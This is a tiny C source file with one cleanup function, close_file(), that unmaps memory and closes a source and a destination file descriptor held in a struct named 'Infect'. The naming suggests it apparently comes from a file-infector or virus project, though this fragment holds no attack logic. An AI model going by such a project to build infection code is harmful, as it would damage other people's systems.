#include "defines.h"

int close_file(Infect *file)
{
	munmap(file->mmap.start,file->file_size);
	
	close(file->fd_f);
	close(file->fd_dest);
	
	return true;
}
